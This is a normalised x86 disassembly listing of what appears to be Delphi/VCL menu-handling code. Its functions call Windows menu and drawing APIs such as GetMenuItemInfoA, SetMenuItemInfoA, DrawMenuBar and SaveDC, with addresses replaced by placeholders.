and eax 0x7f
mov al [ eax + rw-data ]
sub_447de0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_444ac8
mov esi eax
mov [ ebx + 0x34 ] esi
mov [ esi + 0x84 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x38 ]
mov [ esi + 0x80 ] eax
mov [ esi + 0x70 ] ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_403134
mov esi eax
mov [ ebx + 0x44 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] r-xdata
mov [ ebx + 0x41 ] 0x1
mov ecx edi
xor edx edx
mov eax ebx
call sub_41c4b8
mov eax [ ebx + 0x34 ]
mov [ eax + 0x3b ] 0x0
mov [ eax + 0x3c ] 0x0
mov eax ebx
call sub_448b0c
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403470
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034c8
pop [ fs : 0x0 ]
add esp 0xc
sub_447e7c
push ebx
push esi
call sub_4034d8
mov ebx edx
mov esi eax
mov eax [ esi + 0x34 ]
call sub_403164
mov eax [ esi + 0x44 ]
call sub_403164
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41c504
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034c0
sub_447ef0
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax sub_447ef0
mov ecx esi
mov edx [ esi + 0x68 ]
call sub_444634
push 0x1
mov ecx esi
mov edx esi
mov eax esi
call sub_446f78
mov eax ebx
pop esi
pop ebx
retn
sub_447f30
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x50 ]
cmp eax edx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp eax [ ebx + 0x34 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] ebx
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax ebx
call sub_446b74
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x60 ]
cmp eax edx
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax ebx
call sub_446b84
call sub_447f30
pop ecx
test al al
je r-xdata
sub_447fc8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x1 ] cl
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0xc ] edx
mov ecx sub_447f30
mov edx [ eax + 0x34 ]
mov ebx [ edx + 0x68 ]
mov eax edx
xchg ecx eax
mov edx ebx
call sub_444634
mov eax [ ebp - 0xc ]
pop ebx
mov esp ebp
pop ebp
retn
sub_447ff8
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebp edx
mov esi eax
xor edi edi
mov bl 0x1
cmp [ esp ] 0x0
je r-xdata
cmp bl 0x1
jne r-xdata
xor ebx ebx
mov ecx ebx
mov edx ebp
mov eax esi
call sub_447fc8
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
cmp ebp eax
jne r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x54 ] 0x0
je r-xdata
mov eax esi
call sub_44931c
mov edi eax
jmp r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x54 ]
mov eax [ eax + 0x64 ]
sub_448068
push ebx
xor ebx ebx
movzx edx dx
xor ecx ecx
call sub_447fc8
test eax eax
je r-xdata
mov eax ebx
pop ebx
retn
mov edx [ eax ]
call [ edx + 0x44 ]
mov bl 0x1
sub_448084
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov cl 0x1
mov eax esi
call sub_447fc8
mov edi eax
test edi edi
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
test [ edi + 0x1c ] 0x10
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x44 ]
xor edx edx
mov eax edi
call sub_447734
mov ebx eax
xor edx edx
mov eax edi
call sub_447c30
or bl al
test bl bl
je r-xdata
mov eax edi
call sub_44709c
mov eax [ esi + 0x34 ]
call sub_44709c
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov eax edi
call sub_444fd8
mov bl 0x1
jmp r-xdata
mov edx [ rw-data ]
mov ebx eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
cmp edi [ ebx + 0x258 ]
jne r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ ebx + 0x254 ]
push eax
call SendMessageA
test eax eax
je r-xdata
mov eax ebx
call sub_43b8e8
push eax
call DrawMenuBar
sub_448170
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx ]
mov eax [ eax + 0x64 ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea edx [ esi + 0x1 ]
lea eax [ ebp - 0x8 ]
call sub_448170
pop ecx
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub al 0x3
je r-xdata
cmp [ ebp - 0x1 ] 0x2
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
xor eax eax
push ebp
push sub_448295
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
movzx edx [ eax - 0x6 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov cl 0x2
call sub_447fc8
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
mov eax [ ebx ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_44709c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_448160
mov [ ebx ] eax
cmp [ ebx ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x3
jmp r-xdata
mov [ ebp - 0x1 ] 0x2
mov eax [ ebx ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x4 ]
je r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x64 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
test esi esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
sub_4482c4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0xc ] eax
xor eax eax
xor edx edx
mov dl [ ebx + 0x4 ]
mov [ ebp - 0x6 ] dx
cmp [ ebp - 0x6 ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
add [ ebp - 0x6 ] 0x2000
test [ ebx + 0xb ] 0x20
je r-xdata
add [ ebp - 0x6 ] 0x4000
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_424fb0
xor eax eax
push ebp
push sub_4483c2
push [ fs : eax ]
mov [ fs : eax ] esp
add [ ebp - 0x6 ] 0x8000
cmp [ ebp - 0x14 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_424fb0
xor eax eax
push ebp
push sub_448397
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_448170
pop ecx
mov [ ebp - 0xd ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_424fa8
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4483c9
mov eax [ rw-data ]
call sub_424fa8
retn
cmp [ ebp - 0xd ] 0x2
je r-xdata
mov [ ebp - 0xd ] 0x0
movzx edx [ ebp - 0x6 ]
mov cl 0x2
mov eax [ ebp - 0xc ]
call sub_447fc8
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_4483e8
push ebx
push esi
add esp 0xffffff80
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
add esp 0x80
pop esi
pop ebx
retn
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
mov esi eax
mov [ esp ] 0x2c
mov [ esp + 0x4 ] 0x10
lea eax [ esp + 0x30 ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] 0x50
push esp
push 0xffffffff
push 0x0
push esi
call GetMenuItemInfoA
test eax eax
je r-xdata
mov eax ebx
call sub_44876c
mov edx [ esp + 0x8 ]
and edx 0x6000
cmp edx 0x1
sbb edx edx
inc edx
cmp al dl
je r-xdata
mov eax ebx
call sub_44876c
and eax 0x7f
shl eax 0xd
lea eax [ eax + eax * 2 ]
mov edx [ esp + 0x8 ]
and edx 0xffff9fff
or eax edx
mov [ esp + 0x8 ] eax
mov [ esp + 0x4 ] 0x10
push esp
push 0xffffffff
push 0x0
push esi
call SetMenuItemInfoA
test eax eax
je r-xdata
mov eax [ ebx + 0x38 ]
push eax
call DrawMenuBar
sub_4484a4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
push eax
call GetMenuItemCount
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
lea ebx [ eax - 0x200 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffffb
mov [ ebp - 0x8 ] eax
xor esi esi
jmp r-xdata
cmp esi [ ebp - 0xc ]
jge r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x8 ]
jb r-xdata
push ebx
mov eax [ ebp - 0x8 ]
sub eax ebx
push eax
push 0x400
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x204 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
call sub_448a40
mov eax ebx
call sub_4084c0
mov ebx eax
push 0x400
push esi
mov eax [ ebp - 0x4 ]
push eax
call GetMenuState
test al 0x2
je r-xdata
test al 0x40
je r-xdata
mov [ ebx ] 0x24
inc ebx
mov [ ebx ] 0x0
test al 0x1
je r-xdata
mov [ ebx ] 0x40
inc ebx
mov [ ebx ] 0x0
mov [ ebx ] 0x3b
inc ebx
mov [ ebx ] 0x0
inc esi
mov [ ebx ] 0x23
inc ebx
mov [ ebx ] 0x0
sub_448544
push ebp
mov ebp esp
add esp 0xfffffdfc
push ebx
mov [ ebp - 0x204 ] eax
xor ebx ebx
mov [ ebp - 0x200 ] 0x0
mov eax [ ebp - 0x204 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp - 0x204 ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x204 ]
mov edx [ eax ]
call [ edx + 0x34 ]
call sub_4484a4
pop ecx
mov bl 0x1
mov eax [ ebp - 0x204 ]
add eax 0x3c
lea edx [ ebp - 0x200 ]
mov ecx 0x200
call sub_40410c
mov eax [ ebp - 0x204 ]
mov eax [ eax + 0x3c ]
call sub_40435c
lea edx [ ebp - 0x200 ]
call sub_408584
test eax eax
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_4485d8
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x30 ]
mov [ ebp - 0x5 ] al
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x41 ]
mov [ ebp - 0x6 ] dl
xor edx edx
push ebp
push sub_448648
push [ fs : edx ]
mov [ fs : edx ] esp
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_448ae8
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_448ae8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov dl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
call sub_448ae8
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x6 ]
mov [ eax + 0x41 ] dl
retn
sub_448654
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x38 ] esi
mov eax ebx
call sub_448544
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
cmp [ ebx + 0x41 ] 0x0
je r-xdata
mov eax ebx
call sub_4485d8
mov eax ebx
call sub_448b0c
jmp r-xdata
sub_4486bc
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov cl [ ebp + 0x8 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_448704
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x48 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x48 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x44 ]
call sub_442934
mov eax ebx
call sub_447f18
pop esi
pop ebx
retn
mov edx [ ebx + 0x44 ]
call sub_442978
mov edx ebx
mov eax [ ebx + 0x48 ]
call sub_41c588
sub_448740
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_41c7d4
cmp esi [ edi + 0x48 ]
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
xor edx edx
mov eax edi
call sub_448704
sub_448784
push ebp
mov ebp esp
push esi
xor esi esi
test dl 0x10
je r-xdata
push ecx
push eax
call GetMenuItemID
cmp eax 0xffffffff
je r-xdata
push ecx
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_447fc8
mov esi eax
jmp r-xdata
test esi esi
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
xor ecx ecx
xchg edx eax
call sub_447fc8
mov esi eax
xor eax eax
xor eax eax
mov al [ ebp + 0x8 ]
mov edx [ esi + 0x30 ]
call sub_44ba70
jmp r-xdata
pop esi
pop ebp
retn 0x4
sub_4487e0
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi ecx
mov [ ebp - 0x2 ] dx
xor edx edx
push ebp
push sub_4488b5
push [ fs : edx ]
mov [ fs : edx ] esp
test [ ebp - 0x2 ] 0x10
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_447fc8
mov ebx eax
test ebx ebx
je r-xdata
push esi
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_447fc8
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_446b74
cmp esi eax
jge r-xdata
xor ebx ebx
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_446b84
mov ebx eax
lea eax [ ebp - 0x8 ]
mov dl [ ebp + 0x8 ]
call sub_404084
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebx + 0x30 ]
mov dl [ edx ]
call sub_404084
mov eax [ ebp - 0xc ]
pop edx
call sub_407d30
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0x30 ]
call sub_44962c
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov ebx eax
jmp r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4488bc
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_403ec0
retn
sub_4488c8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebp - 0xc ] 0xffffffff
mov [ ebp - 0x10 ] 0xffffffff
mov [ ebp - 0x14 ] 0xffffffff
mov eax [ ebx + 0x8 ]
push eax
call GetMenuItemCount
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
cmp [ ebp - 0xc ] 0xffffffff
jge r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
mov eax [ ebx + 0xc ]
cmp eax 0x2
jne r-xdata
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
mov al [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_448784
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp eax 0x3
jne r-xdata
shl eax 0x10
or eax [ ebp - 0xc ]
mov [ ebx + 0xc ] eax
jmp r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
mov [ ebp - 0xc ] 0xfffffffe
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jge r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
shl eax 0x10
or eax [ ebp - 0x14 ]
mov [ ebx + 0xc ] eax
mov edx [ ebp - 0xc ]
mov [ ebp - 0x14 ] edx
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
mov al [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_4487e0
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
mov [ ebp - 0x14 ] esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
mov [ ebp - 0x14 ] esi
sub_448a40
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_44814c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push edi
call GetMenuStringA
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push eax
push esi
push edi
call GetMenuState
test al 0x10
je r-xdata
push esi
push edi
call GetMenuItemID
mov esi eax
cmp esi 0xffffffff
je r-xdata
push esi
push edi
call GetSubMenu
mov edi eax
mov cl 0x1
mov edx edi
mov eax ebx
call sub_447fc8
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor ecx ecx
mov edx esi
mov eax ebx
call sub_447fc8
mov [ ebp - 0x4 ] eax
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
call sub_408564
mov eax [ ebp + 0x10 ]
call sub_4084a8
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_448b0c
push ebx
mov ebx eax
cmp [ ebx + 0x41 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
call sub_431fec
test eax eax
je r-xdata
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_448ae8
mov [ ebx + 0x41 ] 0x1
sub_448b34
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x41 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403314
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_448ae8
mov [ ebx + 0x41 ] 0x1
sub_448bc0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
cmp [ edi + 0x38 ] 0x0
je r-xdata
mov al [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_4486bc
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax edi
call sub_448544
mov ebx eax
test esi esi
jne r-xdata
test bl bl
je r-xdata
push 0x0
push 0x0
push 0xb015
mov eax [ edi + 0x38 ]
push eax
call SendMessageA
mov eax [ edi + 0x38 ]
push eax
call DrawMenuBar
sub_448c50
push ebx
push esi
mov ebx eax
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x38 ]
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0xb015
push eax
call SendMessageA
sub_448c8c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_448cb6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_448cd8
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x30 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44920b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi ]
cmp eax 0x111
jg r-xdata
sub eax 0x117
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x2b
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call DefWindowProcA
mov [ esi + 0xc ] eax
inc ebx
xor edi edi
mov [ ebp - 0xd ] 0x0
test [ esi + 0x6 ] 0x10
je r-xdata
dec eax
je r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
dec eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_449212
lea eax [ ebp - 0x30 ]
call sub_403e9c
retn
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x27
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_416b18
mov edx [ esi + 0x4 ]
call sub_448084
test al al
jne r-xdata
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_455080
jmp r-xdata
inc ebx
xor edi edi
inc ebx
xor edi edi
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_416b18
mov dx [ esi + 0x4 ]
call sub_448068
test al al
jne r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_41fe10
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_44903e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_449021
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x24 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_420440
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0x14 ]
call sub_4202e0
mov eax [ ebp - 0x24 ]
mov ax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x24 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_4494b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_449028
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_420440
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
movzx eax [ esi + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov edx esi
mov eax [ ebp - 0x2c ]
call sub_4488c8
jmp r-xdata
mov edx [ esi + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0x2c ]
call sub_447fc8
test eax eax
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_416b18
mov edx [ ebp - 0x24 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_447fc8
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call GetWindowDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_449181
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_41fe10
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_44915c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x1c ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_44913f
push [ fs : eax ]
